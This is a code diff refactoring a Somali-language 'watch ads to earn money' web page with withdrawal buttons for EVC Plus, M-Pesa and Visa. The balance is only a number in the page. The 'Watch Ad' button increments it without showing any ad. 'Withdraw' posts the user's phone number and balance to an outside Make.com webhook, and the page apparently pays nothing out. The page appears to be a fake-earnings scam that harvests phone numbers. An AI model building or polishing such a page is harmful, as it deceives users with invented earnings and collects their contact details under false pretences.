@@ -25,8 +25,11 @@
             <p>Haraagaaga</p>
             <h1>$<span id="balance">32.75</span></h1>
         </div>
+        
         <button class="btn btn-ad" onclick="addMoney()">Watch Ad to Earn $5.50</button>
+        
         <input type="text" id="phone" placeholder="Geli lambarkaaga">
+        
         <button class="btn btn-evc" onclick="sendWithdraw('EVC Plus')">Withdraw EVC Plus</button>
         <button class="btn btn-mpesa" onclick="sendWithdraw('M-Pesa')">Withdraw M-Pesa</button>
         <button class="btn btn-visa" onclick="sendWithdraw('Visa')">Withdraw Visa</button>
@@ -35,25 +38,30 @@
 
     <script>
         function addMoney() {
-            let bEl = document.getElementById('balance');
-            let b = parseFloat(bEl.innerText);
-            b += 5.50;
-            bEl.innerText = b.toFixed(2);
+            let balanceEl = document.getElementById('balance');
+            let balance = parseFloat(balanceEl.innerText);
+            balance += 5.50;
+            balanceEl.innerText = balance.toFixed(2);
         }
 
         async function sendWithdraw(method) {
-            let b = document.getElementById('balance').innerText;
-            let p = document.getElementById('phone').value;
-            if (parseFloat(b) < 50) { alert("Lacagta ugu yar waa $50"); return; }
-            if (p.length < 5) { alert("Fadlan geli lambar sax ah"); return; }
-            
-            const url = "https://hook.eu1.make.com/5a5xrq0pc9dmmne8nna40wdg26ud4o41";
-            await fetch(url, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ "Habka": method, "Lambarka": p, "Haraaga": b })
-            });
-            alert("Mahadsanid! Codsigaaga " + method + " waa la gudbiyay.");
+            let balanceEl = document.getElementById('balance');
+            let balance = parseFloat(balanceEl.innerText);
+            let phone = document.getElementById('phone').value;
+
+            if (balance < 50) {
+                alert("Waan ka xunnahay! Lacagta ugu yar waa $50.");
+            } else if (phone.length < 5) {
+                alert("Fadlan geli lambar sax ah.");
+            } else {
+                const url = "https://hook.eu1.make.com/5a5xrq0pc9dmmne8nna40wdg26ud4o41";
+                await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ "Habka": method, "Lambarka": phone, "Haraaga": balance })
+                });
+                alert("Mahadsanid! Codsigaaga " + method + " waa la gudbiyay.");
+            }
         }
     </script>
 </body>
